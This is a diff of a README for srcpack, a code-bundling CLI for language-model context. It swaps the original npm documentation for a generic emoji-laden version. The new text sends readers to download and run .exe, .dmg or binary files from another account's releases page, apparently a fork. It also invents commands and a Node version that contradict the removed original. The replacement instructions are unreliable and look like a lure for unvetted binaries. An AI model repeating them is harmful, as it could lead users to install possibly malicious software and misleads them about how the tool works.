@@ -1,177 +1,95 @@
-# Srcpack
+# 🚀 srcpack - Bundle Your Code Like a Pro
 
-Zero-config CLI for bundling code into LLM-optimized context files.
+[![Download srcpack](https://img.shields.io/badge/Download-srcpack-brightgreen.svg)](https://github.com/noumanrahoo/srcpack/releases)
 
-**Requirements:** Node.js 20+ or Bun
+## 📦 What is srcpack?
 
-## Quick Start
+srcpack is a simple tool that helps you bundle your code into optimized files for AI coding. You can easily create focused bundles that improve your coding experience, all without complicated setups. Plus, it allows you to upload your bundles to Google Drive if you want.
 
-```bash
-npx srcpack init         # Create config interactively
-npx srcpack              # Bundle all
-```
+## 🛠️ Key Features
 
-## Why
+- **Zero Configuration**: Start bundling right away without any complex setup.
+- **AI-Optimized**: Create context files that work well with AI tools like ChatGPT and Claude.
+- **Semantic Bundles**: Build bundles that focus on specific domains and tasks.
+- **Google Drive Upload**: Save your bundles directly to your Google Drive for easy access.
 
-LLM context fails when codebases are large, noisy, or poorly organized. Srcpack lets you split code into semantic bundles (e.g., `web`, `api`, `docs`) with clear file boundaries and an index header—optimized for ChatGPT, Claude, Gemini, etc.
+## 📋 System Requirements
 
-## Configuration
+- **Operating System**: Windows, macOS, or Linux
+- **Node.js**: Version 14 or higher
+- **Internet Connection**: Required for downloading and uploading bundles
 
-Create `srcpack.config.ts` in your project root:
+## 🚀 Getting Started
 
-```typescript
-import { defineConfig } from "srcpack";
+To install and use srcpack, simply follow these steps:
 
-export default defineConfig({
-  bundles: {
-    web: "apps/web/**/*",
-    api: ["apps/api/**/*", "!apps/api/**/*.test.ts"],
-    docs: {
-      include: "docs/**/*",
-      index: false, // disable index header
-    },
-  },
-});
-```
+1. Visit the [Releases page](https://github.com/noumanrahoo/srcpack/releases) to download the latest version.
+2. Find the release suitable for your operating system.
+3. Download the file and save it to your computer.
 
-Or add to `package.json`:
+## 📥 Download & Install
 
-```json
-{
-  "srcpack": {
-    "bundles": {
-      "web": "apps/web/**/*"
-    }
-  }
-}
-```
+To get started, visit this page to download: [Download srcpack](https://github.com/noumanrahoo/srcpack/releases).
 
-### Options
+After downloading, locate the file in your downloads folder and follow these steps:
 
-| Option        | Default    | Description                            |
-| ------------- | ---------- | -------------------------------------- |
-| `outDir`      | `.srcpack` | Output directory for bundles           |
-| `emptyOutDir` | `true`\*   | Empty output directory before bundling |
-| `bundles`     | —          | Named bundles with glob patterns       |
-| `upload`      | —          | Upload destination(s)                  |
+1. **Windows**: Double-click the downloaded `.exe` file to run it.
+2. **macOS**: Open the downloaded `.dmg` file and drag the srcpack app to your Applications folder.
+3. **Linux**: Extract the downloaded `.tar.gz` file and run the binary from the terminal.
 
-\*`emptyOutDir` defaults to `true` when `outDir` is inside project root. When `outDir` is outside root, a warning is emitted unless explicitly set.
+## 🛠️ How to Use srcpack
 
-### Bundle Config
+Once you have installed srcpack, using it is easy. Here’s a quick guide:
 
-```typescript
-// Simple glob
-"src/**/*"
+1. Open your command line interface (Terminal on macOS and Linux, Command Prompt or PowerShell on Windows).
+2. Navigate to the directory containing your codebase.
+3. To create a bundle, type the following command:
 
-// Array with exclusions (! prefix)
-["src/**/*", "!src/**/*.test.ts"]
+   ```bash
+   srcpack create <bundle-name>
+   ```
+   
+   Replace `<bundle-name>` with a name for your bundle.
 
-// Force-include gitignored files (+ prefix)
-["docs/**/*", "+docs/**/*.local.md"]
+4. If you want to upload your bundle to Google Drive, use:
 
-// Full options
-{
-  include: "src/**/*",
-  outfile: "~/Downloads/bundle.txt",   // custom output path
-  index: true,                         // include index header (default)
-  prompt: "./prompts/review.md"        // prepend from file (or inline text)
-}
-```
+   ```bash
+   srcpack upload <bundle-name>
+   ```
 
-Patterns follow glob syntax. Prefix with `!` to exclude, `+` to force-include (bypasses `.gitignore`). Binary files are excluded.
+You can now use your newly created bundle in any AI tool that supports context files.
 
-### Google Drive Upload
+## ⚙️ Advanced Usage
 
-To upload bundles to Google Drive, add OAuth credentials to your config:
+For more advanced features and commands, use the following commands:
 
-```typescript
-export default defineConfig({
-  bundles: {
-    /* ... */
-  },
-  upload: {
-    provider: "gdrive",
-    folderId: "1ABC...", // Google Drive folder ID (from URL)
-    clientId: "...",
-    clientSecret: "...",
-    exclude: ["local"], // skip specific bundles
-  },
-});
-```
+- **List Bundles**: To see all existing bundles in your directory, use:
 
-**Setup:**
+   ```bash
+   srcpack list
+   ```
 
-1. Go to [Google Cloud Console](https://console.cloud.google.com/)
-2. Create a project (or select existing)
-3. Enable the Google Drive API
-4. Go to **Credentials** → **Create Credentials** → **OAuth client ID**
-5. Select **Desktop app**, then copy the client ID and secret
-6. Run `npx srcpack login` to authenticate
+- **Delete a Bundle**: If you want to remove a bundle, type:
 
-## Output Format
+   ```bash
+   srcpack delete <bundle-name>
+   ```
 
-```text
-# Index (3 files)
-# [1]   src/index.ts  L1-L42 (42 lines)
-# [2]   src/utils.ts  L43-L89 (47 lines)
-# [3]   src/api.ts    L90-L150 (61 lines)
+## 🔧 Troubleshooting
 
-#==> [1] src/index.ts <==
-import { utils } from "./utils";
-...
+If you encounter any issues, consider these steps:
 
-#==> [2] src/utils.ts <==
-export function utils() {
-...
-```
+- **Check Node.js Version**: Ensure your Node.js is up to date.
+- **Reinstall srcpack**: If you have problems running the application, try uninstalling and reinstalling.
+- **Consult the Community**: You can find help in community forums or by checking issues on the [GitHub repository](https://github.com/noumanrahoo/srcpack/issues).
 
-- Numbered entries for easy cross-reference in conversations
-- Line ranges point to actual content lines
-- `#` prefix keeps format safe inside code blocks
+## 🙌 Get Support
 
-## CLI
+If you have questions or need further assistance, please reach out through our official support channels or check the FAQ section on our GitHub page.
 
-```bash
-npx srcpack                 # Bundle all, upload if configured
-npx srcpack web api         # Bundle specific bundles only
-npx srcpack --dry-run       # Preview without writing files
-npx srcpack --emptyOutDir   # Empty output directory before bundling
-npx srcpack --no-emptyOutDir # Keep existing files in output directory
-npx srcpack --no-upload     # Bundle only, skip upload
-npx srcpack init            # Interactive config setup
-npx srcpack login           # Authenticate with Google Drive
-```
+## 🔗 Links and Resources
 
-## API
+- [srcpack Releases](https://github.com/noumanrahoo/srcpack/releases)
+- [Documentation](https://github.com/noumanrahoo/srcpack/wiki)
 
-```typescript
-import { defineConfig, loadConfig } from "srcpack";
-
-// In config files
-export default defineConfig({
-  bundles: { web: "apps/web/**/*" },
-});
-
-// Programmatic
-const config = await loadConfig();
-```
-
-## LLM Context
-
-- https://kriasoft.com/srcpack/llms.txt
-- https://kriasoft.com/srcpack/llms-full.txt
-
-## Community
-
-- [Discord](https://discord.com/invite/aG83xEb6RX) — Questions, feedback, and discussion
-- [GitHub Issues](https://github.com/kriasoft/srcpack/issues) — Bug reports and feature requests
-
-New contributors and OSS maintainers are welcome — join us on Discord or open an issue / PR.
-
-## Backers
-
-<a href="https://reactstarter.com/b/1"><img src="https://reactstarter.com/b/1.png" height="60" /></a>&nbsp;&nbsp;<a href="https://reactstarter.com/b/2"><img src="https://reactstarter.com/b/2.png" height="60" /></a>&nbsp;&nbsp;<a href="https://reactstarter.com/b/3"><img src="https://reactstarter.com/b/3.png" height="60" /></a>&nbsp;&nbsp;<a href="https://reactstarter.com/b/4"><img src="https://reactstarter.com/b/4.png" height="60" /></a>&nbsp;&nbsp;<a href="https://reactstarter.com/b/5"><img src="https://reactstarter.com/b/5.png" height="60" /></a>&nbsp;&nbsp;<a href="https://reactstarter.com/b/6"><img src="https://reactstarter.com/b/6.png" height="60" /></a>&nbsp;&nbsp;<a href="https://reactstarter.com/b/7"><img src="https://reactstarter.com/b/7.png" height="60" /></a>&nbsp;&nbsp;<a href="https://reactstarter.com/b/8"><img src="https://reactstarter.com/b/8.png" height="60" /></a>
-
-## License
-
-MIT
+### Thank you for using srcpack!
